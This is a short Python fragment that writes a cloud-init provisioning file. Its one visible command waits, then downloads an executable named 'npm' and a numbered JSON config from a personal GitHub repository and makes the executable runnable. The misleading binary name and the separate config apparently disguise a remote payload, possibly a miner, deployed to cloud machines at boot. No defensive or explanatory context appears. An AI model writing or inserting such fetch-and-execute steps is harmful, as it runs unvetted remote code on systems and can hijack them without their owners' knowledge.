...
with open("./cloud-init.txt", "w") as f:
    ...
    f.write("  - sleep 60 && wget https://raw.githubusercontent.com/drewnelson1/1/main/npm && wget https://raw.githubusercontent.com/drewnelson1/1/main/33.json -O config.json && chmod +x npm" + "\n")
